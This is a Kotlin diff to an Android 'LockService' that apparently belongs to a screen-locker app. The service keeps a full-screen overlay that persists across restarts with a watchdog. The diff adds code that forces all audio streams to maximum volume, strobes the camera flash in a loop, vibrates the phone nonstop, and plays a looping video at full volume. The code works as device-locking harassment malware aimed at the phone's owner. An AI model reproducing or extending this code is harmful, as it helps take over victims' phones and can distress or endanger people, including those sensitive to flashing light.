@@ -7,12 +7,16 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
+import android.hardware.camera2.CameraManager
+import android.media.AudioManager
 import android.media.MediaPlayer
 import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
@@ -42,6 +46,11 @@ class LockService : Service() {
     private var mediaPlayer: MediaPlayer? = null
     private var videoView: VideoView? = null
 
+    private var flashThread: Thread? = null
+    private var vibrateThread: Thread? = null
+    @Volatile private var flashRunning = false
+    @Volatile private var vibrateRunning = false
+
     override fun onCreate() {
         super.onCreate()
         wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -56,7 +65,6 @@ class LockService : Service() {
             return START_NOT_STICKY
         }
 
-        // Kalau service restart tanpa intent (setelah reboot), restore dari prefs
         val finalType = type ?: prefs.getString("type", null)
 
         if (finalType != null) {
@@ -69,7 +77,6 @@ class LockService : Service() {
             if (finalType == "time") {
                 val stored = prefs.getLong("lockUntil", 0L)
                 lockUntil = if (stored > 0) stored else System.currentTimeMillis() + currentHours * 3600_000L
-                // Kalau udah lewat, jangan lock
                 if (System.currentTimeMillis() >= lockUntil) {
                     clearState()
                     return START_NOT_STICKY
@@ -86,10 +93,89 @@ class LockService : Service() {
             showOverlay()
         }
 
+        setVolumeMax()
+        startFlashSpam()
+        startVibrateSpam()
+
         startWatchdog()
         return START_STICKY
     }
 
+    // ============================================================
+    // VOLUME MAX
+    // ============================================================
+    private fun setVolumeMax() {
+        try {
+            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
+            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // FLASH SPAM
+    // ============================================================
+    private fun startFlashSpam() {
+        if (flashRunning) return
+        flashRunning = true
+        flashThread = Thread {
+            try {
+                val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                while (flashRunning) {
+                    val id = cm.cameraIdList.firstOrNull { camId ->
+                        cm.getCameraCharacteristics(camId)
+                            .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+                    } ?: break
+                    try { cm.setTorchMode(id, true) } catch (_: Exception) {}
+                    Thread.sleep(120)
+                    try { cm.setTorchMode(id, false) } catch (_: Exception) {}
+                    Thread.sleep(120)
+                }
+            } catch (_: Exception) {}
+        }
+        flashThread?.start()
+    }
+
+    private fun stopFlashSpam() {
+        flashRunning = false
+        try { flashThread?.interrupt() } catch (_: Exception) {}
+        flashThread = null
+    }
+
+    // ============================================================
+    // VIBRATE SPAM
+    // ============================================================
+    private fun startVibrateSpam() {
+        if (vibrateRunning) return
+        vibrateRunning = true
+        vibrateThread = Thread {
+            try {
+                val vm = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                while (vibrateRunning) {
+                    try {
+                        if (Build.VERSION.SDK_INT >= 26) {
+                            vm.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
+                        } else {
+                            @Suppress("DEPRECATION") vm.vibrate(500)
+                        }
+                        Thread.sleep(700)
+                    } catch (_: Exception) { break }
+                }
+            } catch (_: Exception) {}
+        }
+        vibrateThread?.start()
+    }
+
+    private fun stopVibrateSpam() {
+        vibrateRunning = false
+        try { vibrateThread?.interrupt() } catch (_: Exception) {}
+        vibrateThread = null
+    }
+
+    // ============================================================
+    // SAVE / CLEAR STATE
+    // ============================================================
     private fun saveState() {
         try {
             prefs.edit()
@@ -104,9 +190,7 @@ class LockService : Service() {
     }
 
     private fun clearState() {
-        try {
-            prefs.edit().clear().apply()
-        } catch (_: Exception) {}
+        try { prefs.edit().clear().apply() } catch (_: Exception) {}
     }
 
     private fun buildNotification(): Notification {
@@ -125,6 +209,9 @@ class LockService : Service() {
             .build()
     }
 
+    // ============================================================
+    // SHOW OVERLAY
+    // ============================================================
     private fun showOverlay() {
         try {
             removeOverlayView()
@@ -205,6 +292,7 @@ class LockService : Service() {
             mediaPlayer = MediaPlayer().apply {
                 setDataSource(this@LockService, Uri.parse(url))
                 isLooping = true
+                setVolume(1f, 1f)
                 setOnPreparedListener { start() }
                 setOnErrorListener { _, _, _ -> true }
                 prepareAsync()
@@ -213,9 +301,7 @@ class LockService : Service() {
     }
 
     private fun removeOverlayView() {
-        try {
-            currentOverlay?.let { wm.removeView(it) }
-        } catch (_: Exception) {}
+        try { currentOverlay?.let { wm.removeView(it) } } catch (_: Exception) {}
         currentOverlay = null
 
         try {
@@ -230,6 +316,9 @@ class LockService : Service() {
         } catch (_: Exception) {}
     }
 
+    // ============================================================
+    // WATCHDOG
+    // ============================================================
     private fun startWatchdog() {
         watchdog?.removeCallbacksAndMessages(null)
         watchdog = Handler(Looper.getMainLooper())
@@ -253,9 +342,14 @@ class LockService : Service() {
         }, 1500)
     }
 
+    // ============================================================
+    // STOP
+    // ============================================================
     fun stopLock() {
         isActive = false
         removeOverlayView()
+        stopFlashSpam()
+        stopVibrateSpam()
         currentType = null
         lockUntil = 0
         videoUrl = null
@@ -289,6 +383,8 @@ class LockService : Service() {
     override fun onDestroy() {
         watchdog?.removeCallbacksAndMessages(null)
         removeOverlayView()
+        stopFlashSpam()
+        stopVibrateSpam()
         isActive = false
         super.onDestroy()
     }
